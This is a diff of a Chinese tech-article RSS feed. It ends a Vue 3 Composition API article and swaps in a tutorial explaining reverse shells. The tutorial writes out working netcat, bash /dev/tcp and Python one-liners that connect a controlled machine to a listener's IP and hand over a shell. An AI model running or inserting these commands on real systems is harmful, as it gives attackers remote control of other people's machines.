&lt;span&gt;in&lt;/span&gt; composables&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;💡 如果EsLint将此标记为错误，将&lt;code&gt;&#x27;@typescript-eslint/explicit-module-boundary-types&#x27;: &#x27;error&#x27;&lt;/code&gt;，放入EsLint配置（&lt;code&gt;.eslintrc&lt;/code&gt;）。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;Volar extension&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;Volar是作为VsCode和WebStorm的Vue扩展来取代Vetur的。现在它被正式推荐给Vue 3使用。对我来说，它的主要特点是：&lt;strong&gt;typing props and emits out of the bo&lt;/strong&gt;x。这很好用，特别是使用Typescript的话。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;现在，我总是会选择Vue 3项目中使用Volar。对于Vue 2, Volar仍然适用，因为它需要更少的配置 。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;5. 围绕组合API的应用架构&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;h4 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;将逻辑从**.vue**组件文件中移出&lt;/span&gt;&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;以前，有一些例子，所有的逻辑都是在script setup 中完成的。还有一些例子是使用从&lt;code&gt;.vue&lt;/code&gt;文件导入的可组合函数的组件。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;大代码设计问题是：我们应该把所有的逻辑写在&lt;code&gt;.vue&lt;/code&gt;文件之外吗？有利有弊。&lt;/p&gt;&lt;section data-tool=&quot;mdnice编辑器&quot;&gt;&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;所有的逻辑都放在 setup中&lt;/th&gt;&lt;th&gt;移到专用的.js/.ts文件&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;不需要写一个可组合的，方便直接修改&lt;/td&gt;&lt;td&gt;可扩展更强&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;重用代码时需要重构&lt;/td&gt;&lt;td&gt;不需要重构&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;br/&gt;&lt;/td&gt;&lt;td&gt;更多模板&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/section&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我是这样选择的：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;在小型/中型项目中使用混合方法。一般来说，把逻辑写在setup里面。当组件太大时，或者当很清楚这些代码会被重复使用时，就把它放在单独的&lt;code&gt;js/ts&lt;/code&gt;文件中&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;对于大型项目，只需将所有内容编写为可组合的。只使用setup来处理模板名称空间。&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;作者：Noveo 译者：小智  来源：noveogroup  原文：https://blog.noveogroup.com/2022/02/building-app-around-vue-3-composition-api&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/div&gt;&lt;/div&gt;</content:encoded>
 </item>
 <item>
-<guid>85e4de88416ccbbb069cc4dd05af063e</guid>
-<title>Kubernetes网络插件详解 - Flannel篇</title>
-<link>https://toutiao.io/k/a1mop7y</link>
-<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;profile_inner&quot;&gt;
-                  &lt;strong class=&quot;profile_nickname&quot;&gt;巨子嘉&lt;/strong&gt;
-                  &lt;img class=&quot;profile_avatar&quot; id=&quot;js_profile_qrcode_img&quot; src=&quot;&quot; alt=&quot;&quot;/&gt;
-
-                  &lt;p class=&quot;profile_meta&quot;&gt;
-                  &lt;label class=&quot;profile_meta_label&quot;&gt;Weixin ID&lt;/label&gt;
-                  &lt;span class=&quot;profile_meta_value&quot;&gt;juzijia-club&lt;/span&gt;
-                  &lt;/p&gt;
-
-                  &lt;p class=&quot;profile_meta&quot;&gt;
-                  &lt;label class=&quot;profile_meta_label&quot;&gt;About Feature&lt;/label&gt;
-                  &lt;span class=&quot;profile_meta_value&quot;&gt;容器，微服务及开源产品在大企业中的平台产品化建设之路&lt;/span&gt;
-                  &lt;/p&gt;
-                &lt;/div&gt;
-                &lt;/div&gt;&lt;/div&gt;</content:encoded>
+<guid>d2bbddb8bd4db6583444cd020d4e4a02</guid>
+<title>什么是反弹 Shell？</title>
+<link>https://toutiao.io/k/ltdnh1m</link>
+<content:encoded>&lt;div&gt;&lt;div&gt;&lt;section data-tool=&quot;mdnice编辑器&quot; data-website=&quot;https://www.mdnice.com&quot;&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-galleryid=&quot;&quot; data-ratio=&quot;0.6666666666666666&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/atOH362BoyvhaOicxWgZtxUs5b44yCmIap0MkUAcj4y5xYd0ZI62DiaJPkopWHqKcUIyiaZ6lvb1hmH2MjyrNCG5g/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;section&gt;&lt;span/&gt;&lt;/section&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;前段时间被一位产品经理嘲笑了，说我居然连反弹 Shell 都不知道&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;说实话当时我还真不知道，但这口气咽不下去啊，得赶紧学来看看，这不，我已经学会了&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;学完之后我特地来记录下，同时分享给大家，以后产品经理再也不敢嘲笑我们不懂反弹 Shell 了&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;什么是反弹 Shell&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我们都知道 Shell 的概念吧，简单来说，Shell 就是实现用户命令的接口，通过这个接口我们就能实现对计算机的控制，比如我们常见的 ssh 就是执行的 Shell 命令实现对远程对服务器的控制&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;那反弹 Shell 是啥呢？&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;其英文名叫做 Reverse Shell，具体干什么的呢？就是控制端首先监听某个 TCP/UDP 端口，然后被控制端向这个端口发起一个请求，同时将自己命令行的输入输出转移到控制端，从而控制端就可以输入命令来控制被控端了&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;比如说，我们有两台主机 A、B，我们最终想实现在 A 上控制 B。那么如果用正向 Shell，其实就是在 A 上输入 B 的连接地址，比如通过 ssh 连接到 B，连接成功之后，我们就可以在 A 上通过命令控制 B 了。如果用反向 Shell，那就是在 A 上先开启一个监听端口，然后让 B 去连接 A 的这个端口，连接成功之后，A 这边就能通过命令控制 B了&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;反弹 Shell 有什么用？&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;还是原来的例子，我们想用 A 来控制 B，如果想用 ssh 等命令来控制，那得输入 B 的 sshd 地址或者端口对吧？但是在很多情况下，由于防火墙、安全组、局域网、NAT 等原因，我们实际上是无法直接连接到 B 的&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;比如：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;A 虽然有公网 IP，但 B 是一个处于内网的机器，A 就没法直接连到 B 上&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;B 上开了防火墙或者安全组限制，sshd 的服务端口 22 被封闭了&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;B 是一台拨号主机，其 IP 地址经常变动&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;假如 B 被攻击了，我们想让 B 向 A 汇报自己的状况，那自然就需要 B 主动去连接 A&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如果是这些情况，我们就可以用反弹 Shell 用 A 来控制 B 了&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;反弹 Shell 案例&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;首先我们先看一个标准的反弹 Shell 的例子，这里我们一共需要两台主机：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;A 是控制端，可以处于公网之中，也可以和 B 处于一个局域网中，总之能让 B 找到 A 就行&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;B 是被控端，可以处在局域网之中&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在开始之前我们需要用到 nc 命令，安装非常简单&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如果是 CentOS 系列系统，安装命令如下：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;yum install -y nc # CentOS&lt;br/&gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如果是 Ubuntu 系列系统，安装命令可以参考 &lt;span&gt;https://stackoverflow.com/questions/10065993/how-to-switch-to-netcat-traditional-in-ubuntu&lt;/span&gt;&lt;sup&gt;[1]&lt;/sup&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;接着，我们在 A 上执行如下命令：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;nc -lvp 32767&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这个命令的意思是开启 32767 的端口监听，运行之后如图所示：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.23426212590299278&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/DAE6TYB3GWibRnMC5leYoDDgwtiadCibTyLSnA1bhXjpJibxQTz00NicicCgGlHIRicnZGVOibX0GV2joTibEUhuX5ssKsQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1938&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这样就表明 A 上正在监听 32767 端口的连接了&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这时候，我们可以在 B 上通过类似的命令连接到 A，假如 A 的 IP 是 111.112.113.114，那么命令如下：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;nc 111.112.113.114 32767 -e /bin/bash&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;“&lt;/span&gt;&lt;p&gt;注意：你在运行的时候需要替换成 A 的真实 IP 和端口。&lt;/p&gt;&lt;span&gt;”&lt;/span&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;运行完毕之后，我们反过来观察下 A，就显示了来自某个 IP 和端口的连接，我们就可以输入命令来控制 B 了，比如这里我们输入了：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;uname -a&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;然后就可以得到 B 的主机名了&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如图所示：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.1930164888457808&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/DAE6TYB3GWibRnMC5leYoDDgwtiadCibTyLo2xjZjVK4K0zQLES6Vhqn9ugLVrU1OCItO1nZldlMp0tXibkpADdsXg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;2062&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这样我们就通过 nc 包实现了反弹 Shell&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;有人说，这 B 上一定需要安装 nc 这个包吗？&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;其实不一定的，我们可以直接使用 bash 来实现反弹 Shell，命令如下：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/111.112.113.114/32767 0&amp;gt;&amp;amp;1&lt;br/&gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这个命令大致解释下：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;code&gt;bash -i&lt;/code&gt; 就是产生一个 bash 交互环境&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;code&gt;&amp;gt;&amp;amp;&lt;/code&gt;可以将 bash 交互环境的输入、输出、错误输出都输出到一个地方&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;code&gt;/dev/tcp/111.112.113.114/32767&lt;/code&gt; 其实指的就是目标主机的一个连接地址，因为 Linux 环境中所有内容的定义都是以文件的形式存在的，指定这个地址就是让主机和目标主机建立一个 TCP 连接&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;code&gt;0&amp;gt;&amp;amp;1&lt;/code&gt;可以将标准输入和标准输出相结合，重定向给前面标准输出的内容&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;通过这样的命令，我们就可以就是将 B的标准输出和错误输出都重定向给 A，并且将 A 的输入都重定向给 B，这样我们就可以实现 A 对 B 的远程控制了&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如图所示：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.33751743375174337&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/DAE6TYB3GWibRnMC5leYoDDgwtiadCibTyLtcicvFS3wUrItkssuIibrrAiclOZ2lsRlI7bLw5QNZibvVuA9HV6MXnCxg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;717&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;比如这样我们就可以轻松在 A 主机上拿到 B 主机的主机名、当前所处路径等内容了&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;另外除了用 bash，我们还可以利用 Python 进行反弹 Shell，脚本如下：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;python -c &#x27;import socket,subprocess,os; \&lt;br/&gt;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);&lt;br/&gt;s.connect((&quot;111.112.113.114&quot;,32767));&lt;br/&gt;os.dup2(s.fileno(),0);&lt;br/&gt;os.dup2(s.fileno(),1);&lt;br/&gt;os.dup2(s.fileno(),2);&lt;br/&gt;p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&lt;br/&gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;可以达到同样反弹 Shell 的效果，即可以用 A 来控制 B&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;总结&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;以上就是反弹 Shell 的介绍，灵活运用反弹 Shell 可以大大便利某些场景下的远程控制，希望对大家有帮助&lt;/p&gt;&lt;section class=&quot;mp_profile_iframe_wrp&quot;&gt;&lt;mpprofile class=&quot;js_uneditable custom_select_card mp_profile_iframe&quot; data-pluginname=&quot;mpprofile&quot; data-id=&quot;MzU1OTI0NjI1NQ==&quot; data-headimg=&quot;http://mmbiz.qpic.cn/mmbiz_png/atOH362BoyuUe1icelWmbMyTCRwoFPScmosYQheSZ9wsmr61Bfr2rvNav9j9QpDnUulNpCotEiaAoLzSAm4jZTjA/0?wx_fmt=png&quot; data-nickname=&quot;AirPython&quot; data-alias=&quot;AirPython&quot; data-signature=&quot;专注于Python爬虫/自动化/Web原创技术干货！&quot; data-from=&quot;0&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-tools=&quot;135编辑器&quot; data-id=&quot;93451&quot;&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-tools=&quot;135编辑器&quot; data-id=&quot;92877&quot;&gt;&lt;section&gt;&lt;br/&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;section&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-tools=&quot;135编辑器&quot; data-id=&quot;93451&quot;&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-tools=&quot;135编辑器&quot; data-id=&quot;92877&quot;&gt;&lt;section data-width=&quot;100%&quot;&gt;&lt;section&gt;&lt;section data-brushtype=&quot;text&quot;&gt;&lt;span&gt;好文和朋友一起看~&lt;/span&gt;&lt;em/&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;
+          &lt;/div&gt;&lt;/div&gt;</content:encoded>
 </item>
 </channel></rss>
